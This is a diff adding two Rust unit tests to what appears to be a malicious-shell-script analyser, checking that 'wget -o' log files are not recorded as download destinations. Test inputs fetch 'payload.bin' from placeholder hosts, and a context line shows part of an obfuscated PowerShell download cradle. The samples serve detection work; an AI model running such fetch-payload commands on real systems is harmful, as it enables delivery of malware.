@@ -8114,6 +8114,34 @@ mod wget_tests {
     }
 
     #[test]
+    fn wget_lowercase_o_logfile_is_not_download_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget -o wget.log https://wget-log.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://wget-log.example/payload.bin", None)],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.modified_filesystem.contains_key("wget.log"),
+            "wget logfile was tracked as a payload destination: {:?}",
+            env.modified_filesystem
+        );
+    }
+
+    #[test]
     fn wget_schemeless_domain_path_records_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -19107,6 +19135,29 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
         assert!(
             has,
             "wget -ODEST destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_lowercase_o_logfile_in_deob_text_is_not_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -o wget.log https://wget-log-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://wget-log-deob.example/payload.bin", None)],
+            "traits: {:?}",
             env.traits
         );
     }
